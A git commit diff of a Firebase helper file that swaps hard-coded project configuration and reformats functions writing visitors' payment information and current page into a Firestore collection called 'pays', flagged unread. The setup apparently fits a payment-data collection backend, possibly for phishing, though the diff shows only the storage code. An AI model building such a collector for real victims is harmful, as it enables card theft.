9a5a77db458a87ea2aecdb11b0c1f87b258a2c1f
wqedsfgbvn <alopopau@gmail.com>
2026-02-14 19:49:37 +0000

    asss

--- lib/firebase.ts
+++ lib/firebase.ts
@@ -1,64 +1,63 @@
-
-import { getApp, getApps, initializeApp } from 'firebase/app';
-import { getDatabase } from 'firebase/database';
-import { doc, getFirestore, setDoc, updateDoc } from 'firebase/firestore';
+import { getApp, getApps, initializeApp } from "firebase/app";
+import { getDatabase } from "firebase/database";
+import { doc, getFirestore, setDoc, updateDoc } from "firebase/firestore";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyASAN3tdSQU7bP2tB0YIGwKoTvpHxXEkxM",
-  authDomain: "fiafsx.firebaseapp.com",
-  databaseURL: "https://fiafsx-default-rtdb.firebaseio.com",
-  projectId: "fiafsx",
-  storageBucket: "fiafsx.firebasestorage.app",
-  messagingSenderId: "961572278430",
-  appId: "1:961572278430:web:1233efaa9217b51c75ab8f",
-  measurementId: "G-NLEQ8KKXYG"
+  apiKey: "AIzaSyDx7jRudItQzl435lTkrETc9tGCiLtKmLM",
+  authDomain: "extrazm.firebaseapp.com",
+  databaseURL: "https://extrazm-default-rtdb.firebaseio.com",
+  projectId: "extrazm",
+  storageBucket: "extrazm.firebasestorage.app",
+  messagingSenderId: "560730624706",
+  appId: "1:560730624706:web:2a4892077eff380162a15b",
 };
 
 const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
 const db = getFirestore(app);
 const database = getDatabase(app);
 
-
-
-
 export async function addData(data: any) {
-  localStorage.setItem('visitor', data.id);
+  localStorage.setItem("visitor", data.id);
   try {
-    const docRef = await doc(db, 'pays', data.id!);
-    await setDoc(docRef, { 
-      ...data, 
-      createdAt: new Date().toISOString(),
-      updatedAt: new Date().toISOString(),
-      isRead:false  // Mark as unread whenever data is updated
-    }, {merge:true});
+    const docRef = await doc(db, "pays", data.id!);
+    await setDoc(
+      docRef,
+      {
+        ...data,
+        createdAt: new Date().toISOString(),
+        updatedAt: new Date().toISOString(),
+        isRead: false, // Mark as unread whenever data is updated
+      },
+      { merge: true }
+    );
 
-    console.log('Document written with ID: ', docRef.id);
+    console.log("Document written with ID: ", docRef.id);
     // You might want to show a success message to the user here
   } catch (e) {
-    console.error('Error adding document: ', e);
+    console.error("Error adding document: ", e);
     // You might want to show an error message to the user here
   }
 }
 
-export const handleCurrentPage=(page:string)=>{
-const visitorId=localStorage.getItem('visitor')
-addData({id:visitorId,currentPage:page})
-}
+export const handleCurrentPage = (page: string) => {
+  const visitorId = localStorage.getItem("visitor");
+  addData({ id: visitorId, currentPage: page });
+};
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
   try {
-    const visitorId = localStorage.getItem('visitor');
+    const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
-      const docRef = doc(db, 'pays', visitorId);
+      const docRef = doc(db, "pays", visitorId);
       await setDoc(
         docRef,
-        { ...paymentInfo, status: 'pending' },
+        { ...paymentInfo, status: "pending" },
         { merge: true }
       );
-      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
+      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
     }
   } catch (error) {
-    console.error('Error adding document: ', error);
-    alert('Error adding payment info to Firestore');
+    console.error("Error adding document: ", error);
+    alert("Error adding payment info to Firestore");
   }
 };
 export { db, database, updateDoc, doc };
